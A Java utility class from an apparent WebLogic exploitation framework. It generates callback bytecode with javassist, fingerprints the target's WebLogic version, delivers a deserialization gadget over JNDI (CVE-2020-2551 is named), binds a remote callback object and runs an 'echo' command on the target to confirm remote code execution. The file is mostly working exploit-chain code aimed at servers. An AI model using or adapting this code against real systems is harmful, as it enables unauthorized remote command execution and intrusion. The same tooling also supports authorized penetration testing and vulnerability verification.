/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.utils;

import com.r4v3zn.weblogic.framework.call.Call;
import com.r4v3zn.weblogic.framework.call.FileOutputStreamCall;
import com.r4v3zn.weblogic.framework.call.JavascriptCall;
import com.r4v3zn.weblogic.framework.enmus.CallEnum;
import com.r4v3zn.weblogic.framework.entity.ContextPojo;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.entity.MyException;
import com.r4v3zn.weblogic.framework.entity.VulCheckParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import com.r4v3zn.weblogic.framework.vuls.VulTest;
import com.r4v3zn.weblogic.framework.vuls.impl.CVE_2020_2551;
import javassist.ClassPool;
import javassist.CtClass;

import javax.naming.Context;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.Remote;

import static com.r4v3zn.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static com.r4v3zn.weblogic.framework.utils.CallUtils.*;
import static com.r4v3zn.weblogic.framework.utils.VersionUtils.checkVersion;
import static com.r4v3zn.weblogic.framework.utils.VersionUtils.getVersion;
import static com.r4v3zn.weblogic.framework.vuls.impl.CVE_2020_2551.STATIC_BIND_NAME;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: PayloadUtils
 * Desc: Payload Utils
 * Date: 2020/4/19 18:07
 *
 * @version 1.0.0
 */
public class PayloadUtils {
    /**
     * 私有化构造
     */
    private PayloadUtils(){}

    /**
     * 生成回调 POC
     * @param callName
     * @param token
     * @return
     */
    public static Object generatePocCall(String callName, String token) throws Exception {
        callName = isBlank(callName) ? DEFAULT_CALL : callName;
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getAndRename(callClazz.getName(), callClazz.getSimpleName());
        ctClass.getDeclaredMethod("jndiBind").insertBefore("$1=\""+token+"\";");
        ctClass.writeFile(System.getProperty("user.dir"));
        System.out.println(callName+" 写入成功，token："+token);
        return null;
    }

    /**
     * 通用漏洞验证
     * @param url url
     * @param gadgetClazz gadget Clazz
     * @param vulTest vulTest
     * @param vulCheckParam 漏洞验证参数
     * @return
     * @throws Exception
     */
    public static Boolean baseVulnerable(String url, final Class<? extends ObjectGadget<?>> gadgetClazz, final VulTest vulTest, VulCheckParam vulCheckParam) throws Exception{
        if(vulCheckParam == null){
            vulCheckParam = new VulCheckParam();
            vulCheckParam.setCharsetName(defaultCharsetName);
            vulCheckParam.setCallName(DEFAULT_CALL);
            URL targetUrl = new URL(url);
            vulCheckParam.setVersion(getVersion(targetUrl.getHost(), targetUrl.getPort() == -1 ? 80: targetUrl.getPort()));
        }
        String version = vulCheckParam.getVersion();
        version = isBlank(version) ? "10.3.6.0" :version;
        String[] vulVersions = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_VERSIONS");
        String[] vulDependencies = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_DEPENDENCIES");
        Boolean versionFlag = checkVersion(version,vulVersions);
        if(!versionFlag){
            return false;
        }
        String[] versionArr = version.split("\\.");
        if(versionArr.length < 2){
            throw new MyException("版本获取错误");
        }
        String javascriptUrl = "";
        if(vulCheckParam.getCall() == CallEnum.JAVASCRIPT){
            if(Integer.parseInt(versionArr[0]) > 11 && Integer.parseInt(versionArr[1]) > 1){
                if (isBlank(vulCheckParam.getJavascriptUrl())){
                    throw new MyException("javascript URL 不能为空！");
                }else{
                    javascriptUrl = vulCheckParam.getJavascriptUrl();
                }
            }
        }
        URLClassLoader urlClassLoader = ClassLoaderUtils.loadJar(version,vulDependencies);
        // 编码，默认根据用户的操作系统提取
        String charsetName = isBlank(vulCheckParam.getCharsetName()) ? defaultCharsetName : vulCheckParam.getCharsetName();
        // 回调类名称，默认为 ClusterMasterRemote
        String callName = isBlank(vulCheckParam.getCallName()) ? DEFAULT_CALL : vulCheckParam.getCallName();
        // 构建回调类字节码
        byte[] bytes = buildBytes(callName);
        String bindName = StringUtils.getRandomString(16);
        if(vulTest instanceof CVE_2020_2551){
            bindName = STATIC_BIND_NAME;
        }
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        GadgetParam gadgetParam = new GadgetParam();
        gadgetParam.setBootArgs(new String[]{bindName, javascriptUrl});
        gadgetParam.setCodeByte(bytes);
        gadgetParam.setClassName(callClazz.getSimpleName());
        gadgetParam.setUrlClassLoader(urlClassLoader);
        gadgetParam.setJndiUrl(vulCheckParam.getJndiUrl());
        String jndiUrl = UrlUtils.buildJNDIUrl(url, vulCheckParam.getProtocol());
        ContextPojo contextPojo = new ContextPojo();
        contextPojo.setContext(ContextUtils.getContext(jndiUrl));
        contextPojo.setUrlClassLoader(urlClassLoader);
        CallEnum callEnum = vulCheckParam.getCall();
        Call call = new JavascriptCall();
        if(callEnum == CallEnum.FILE_OUTPUT_STREAM){
            call = new FileOutputStreamCall();
        }
        contextPojo = call.executeCall(gadgetParam, vulTest, gadgetClazz, contextPojo);
        if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
            return false;
        }
        Context context = contextPojo.getContext();
        try{
            Object objectCall = context.lookup(bindName);
            ReflectionUtils.setFieldValue(vulTest, "bindName", bindName);
            ReflectionUtils.setFieldValue(vulTest, "currentContext", context);
            ReflectionUtils.setFieldValue(vulTest, "remote", objectCall);
            String result = vulTest.exploit(url, "echo a136d86442181f45a4446f5fb8a49f7f", charsetName);
            return result.contains("a136d86442181f45a4446f5fb8a49f7f");
        }catch (Exception e){
            return false;
        }finally {
            // 设置为 null，强制让 GC 回收
            urlClassLoader = null;
            System.gc();
        }
    }

    public static void main(String[] args) throws Exception {
        for (String callName:CALL_MAP.keySet()) {
            generatePocCall(callName,"testInfo");
            System.out.println("generatePocCall --> "+callName+ "ok!");
        }
    }

}
